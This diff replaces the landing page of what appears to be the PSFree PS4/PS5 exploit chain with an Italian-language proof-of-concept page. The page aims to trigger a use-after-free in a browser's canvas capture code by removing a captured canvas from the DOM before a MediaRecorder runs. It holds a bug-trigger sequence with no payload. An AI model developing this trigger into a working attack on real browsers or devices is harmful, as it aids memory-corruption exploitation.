@@ -1,41 +1,81 @@
-<!-- Copyright (C) 2023-2025 anonymous
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8" />
+    <title>PoC UAF in CanvasCaptureMediaStreamTrack::captureCanvas</title>
+    <style>
+        canvas {
+            border: 2px solid #444;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 8px 16px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2>PoC UAF in <code>CanvasCaptureMediaStreamTrack::captureCanvas()</code></h2>
 
-This file is part of PSFree.
+    <button id="startButton">Avvia PoC</button>
+    <canvas id="myCanvas" width="320" height="180"></canvas>
+    <video id="video" autoplay muted playsinline style="display:none;"></video>
 
-PSFree is free software: you can redistribute it and/or modify
-it under the terms of the GNU Affero General Public License as
-published by the Free Software Foundation, either version 3 of the
-License, or (at your option) any later version.
+    <script>
+        const startBtn = document.getElementById("startButton");
+        const canvas   = document.getElementById("myCanvas");
+        const videoEl  = document.getElementById("video");
 
-PSFree is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU Affero General Public License for more details.
+        startBtn.addEventListener("click", () => {
+            startBtn.disabled = true;
+            alert("1) Disegno un rettangolo sul canvas...");
+            const ctx = canvas.getContext("2d");
+            ctx.fillStyle = "#44a";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>.
--->
-<html>
-    <head>
-        <meta charset='utf-8'>
-        <title>exploit</title>
-        <style>
-            @font-face {
-                font-family: 'logging';
-                src: url('fonts/LiberationMono-Regular.ttf');
+            alert("2) Chiamo canvas.captureStream()...");
+            let stream;
+            try {
+                stream = canvas.captureStream(0);
+            } catch (e) {
+                alert(`❌ captureStream() fallito: ${e}`);
+                return;
             }
-            #console {
-                font-family: 'logging';
+            alert("⮕ MediaStream ottenuto.");
+            alert("3) Collego il MediaStream al <video>...");
+            videoEl.srcObject = stream;
+            videoEl.addEventListener("loadeddata", onVideoLoaded);
+        });
+
+        function onVideoLoaded() {
+            alert("4) loadeddata ricevuto.");
+            videoEl.removeEventListener("loadeddata", onVideoLoaded);
+            alert("5) Rimuovo <canvas> dal DOM...");
+            canvas.parentNode.removeChild(canvas);
+            setTimeout(triggerFrameCapture, 50);
+        }
+
+        function triggerFrameCapture() {
+            alert("6) Attivo MediaRecorder...");
+            try {
+                const recorder = new MediaRecorder(videoEl.srcObject);
+                recorder.ondataavailable = () => {
+                    alert("   • ondataavailable ricevuto.");
+                };
+                recorder.onerror = e => {
+                    alert(`   ❌ MediaRecorder errore: ${e.error.name}`);
+                };
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    alert("   • Recorder stoppato.");
+                }, 100);
+            } catch (e) {
+                alert(`   ❌ Errore MediaRecorder: ${e.name}`);
             }
-        </style>
-    </head>
-    <body>
-        PSFree: A PS4/PS5 Exploit Chain<br>
-        Donation (Monero/XMR):<br>
-        86Fk3X9AE94EGKidzRbvyiVgGNYD3qZnuKNq1ZbsomFWXHYm6TtAgz9GNGitPWadkS3Wr9uXoT29U1SfdMtJ7QNKQpW1CVS<br>
-        See <a href='./about.html' data-jslicense='1'>JavaScript license information</a> for the
-        source code and license.<br>
-        <pre id='console'></pre>
-    </body>
-    <script type='module' src='alert.mjs'></script>
+            alert("Fine test.");
+        }
+    </script>
+</body>
 </html>
